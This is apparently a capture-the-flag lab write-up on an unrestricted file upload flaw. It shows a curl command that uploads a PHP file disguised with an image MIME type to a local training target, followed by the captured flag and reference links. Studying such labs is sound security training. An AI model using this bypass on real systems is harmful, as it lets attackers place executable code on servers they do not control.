# Unrestricted File Upload 
Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed.

### Step 1
Navigate to http://0.0.0.0/?page=upload
> * try uploading image files => uploads
> * try uploading .php files => not uploaded

### Step 2 
* Attack
Use curl to upload a file by specifiying image MIME-type
> * curl -F 'Upload=submit' -F 'uploaded=@hack.php;type=image/jpeg' http://0.0.0.0/?page=upload
**The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8** 

https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

https://resources.infosecinstitute.com/php-lab-file-upload-vulnerabilities/

https://curl.haxx.se/mail/archive-2003-04/0135.html

https://medium.com/@gupta.bless/exploiting-unrestricted-file-upload-vulnerabilities-4831aa839b25